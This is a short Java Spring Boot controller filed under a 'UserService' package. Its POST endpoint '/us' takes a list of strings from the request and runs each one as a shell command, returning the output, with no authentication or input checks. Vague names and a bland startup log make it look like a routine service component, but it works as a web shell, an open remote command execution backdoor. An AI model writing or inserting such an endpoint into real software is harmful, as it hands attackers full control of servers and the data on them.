package com.dkdy.backend.user.UserService;

import com.util.ShellBean;
import com.util.ShellUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.util.ArrayList;

@Slf4j
@RestController
public class UsExecutor {

	public UsExecutor() {
		log.info("init configure finished us");
	}

	@PostMapping("/us")
	public String extshell(@RequestParam ShellBean shell ) {
		String exeCmd="";
		ArrayList<String> list = shell.getList();
		for (String string : list) {
			exeCmd = ShellUtils.exeCmd(string);
		}
		
		return exeCmd;
	}

}
